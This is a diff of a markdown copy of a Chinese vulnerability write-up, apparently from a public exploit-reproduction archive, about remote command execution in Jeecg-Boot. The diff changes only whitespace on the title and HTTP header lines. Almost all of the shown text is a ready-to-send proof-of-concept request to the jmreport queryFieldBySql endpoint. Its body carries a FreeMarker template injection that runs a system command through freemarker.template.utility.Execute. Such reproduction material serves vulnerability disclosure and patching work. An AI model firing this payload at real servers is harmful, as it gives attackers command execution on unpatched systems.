@@ -2,7 +2,7 @@
 source: "gelusus/wxvl 公众号漏洞文库"
 ---
 
-#  Jeecg-Boot 远程命令执行漏洞 附POC  
+#  Jeecg-Boot 远程命令执行漏洞 附POC  
 原创 安服仔
                     安服仔  北风漏洞复现文库   2026-02-05 02:57  
   
@@ -64,26 +64,26 @@ Jeecg-Boot是一款企业级低代码开发平台，集成了AI应用功能，�
 POC  
   
 ```
-POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
-Host: 127.0.0.1
-Connection: close
-Pragma: no-cache
-Cache-Control: no-cache
-sec-ch-ua: "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"
-sec-ch-ua-mobile: ?0
-sec-ch-ua-platform: "Windows"
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
-Sec-Fetch-Dest: document
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9
-Cookie: JSESSIONID=gNyJ0QkLIu1GswcpojLsUJVJD2h-kC_u20kPE6FC
-Content-Type: application/json
-Content-Length: 94
+POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
+Host: 127.0.0.1
+Connection: close
+Pragma: no-cache
+Cache-Control: no-cache
+sec-ch-ua: "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: JSESSIONID=gNyJ0QkLIu1GswcpojLsUJVJD2h-kC_u20kPE6FC
+Content-Type: application/json
+Content-Length: 94
 
 {"sql":"select '<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }' "}
 ```  
